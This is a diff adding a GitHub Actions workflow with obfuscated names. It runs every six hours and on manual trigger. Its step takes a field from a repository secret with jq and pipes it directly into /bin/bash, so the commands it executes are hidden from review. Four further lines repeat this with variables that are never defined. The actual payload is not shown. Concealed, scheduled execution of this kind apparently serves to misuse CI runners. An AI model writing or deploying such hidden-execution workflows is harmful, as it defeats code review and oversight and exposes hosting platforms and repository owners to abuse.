@@ -1,0 +1,21 @@
+name: lubingchao4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lubingchao4567
+        env:
+          rsor900: ${{ secrets.rsor900 }}
+        run: |
+          echo $rsor900 | jq -r .kzjfc49724 | /bin/bash
+          echo $ccs7 | jq -r .o853 | /bin/bash
+          echo $i1536 | jq -r .zc74 | /bin/bash
+          echo $iv851 | jq -r .fqyts24562 | /bin/bash
+          echo $kpawm3478 | jq -r .yfx362 | /bin/bash
+
